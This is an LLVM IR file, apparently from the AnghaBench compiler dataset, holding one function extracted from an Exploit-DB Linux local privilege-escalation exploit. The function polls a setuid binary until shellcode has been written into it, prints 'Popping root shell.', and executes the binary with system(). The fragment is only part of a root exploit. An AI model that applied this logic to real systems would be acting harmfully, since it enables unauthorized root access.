; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_40616.c_waitForWrite.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_40616.c_waitForWrite.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@sc_len = common dso_local global i32 0, align 4
@suid_binary = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [3 x i8] c"rb\00", align 1
@sc = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [19 x i8] c"%s is overwritten\0A\00", align 1
@stop = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [21 x i8] c"Popping root shell.\0A\00", align 1
@.str.3 = private unnamed_addr constant [34 x i8] c"Don't forget to restore /tmp/bak\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @waitForWrite(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i64, align 8
  %6 = alloca i32*, align 8
  store i8* %0, i8** %3, align 8
  %7 = load i32, i32* @sc_len, align 4
  %8 = zext i32 %7 to i64
  %9 = call i8* @llvm.stacksave()
  store i8* %9, i8** %4, align 8
  %10 = alloca i8, i64 %8, align 16
  store i64 %8, i64* %5, align 8
  br label %11

11:                                               ; preds = %24, %1
  %12 = load i8*, i8** @suid_binary, align 8
  %13 = call i32* @fopen(i8* %12, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0))
  store i32* %13, i32** %6, align 8
  %14 = load i32, i32* @sc_len, align 4
  %15 = load i32*, i32** %6, align 8
  %16 = call i32 @fread(i8* %10, i32 %14, i32 1, i32* %15)
  %17 = load i32, i32* @sc, align 4
  %18 = load i32, i32* @sc_len, align 4
  %19 = call i64 @memcmp(i8* %10, i32 %17, i32 %18)
  %20 = icmp eq i64 %19, 0
  br i1 %20, label %21, label %24

21:                                               ; preds = %11
  %22 = load i8*, i8** @suid_binary, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i8* %22)
  br label %28

24:                                               ; preds = %11
  %25 = load i32*, i32** %6, align 8
  %26 = call i32 @fclose(i32* %25)
  %27 = call i32 @sleep(i32 1)
  br label %11

28:                                               ; preds = %21
  store i32 1, i32* @stop, align 4
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0))
  %31 = load i8*, i8** @suid_binary, align 8
  %32 = call i32 @system(i8* %31)
  %33 = load i8*, i8** %4, align 8
  call void @llvm.stackrestore(i8* %33)
  %34 = load i8*, i8** %2, align 8
  ret i8* %34
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @fread(i8*, i32, i32, i32*) #2

declare dso_local i64 @memcmp(i8*, i32, i32) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @system(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
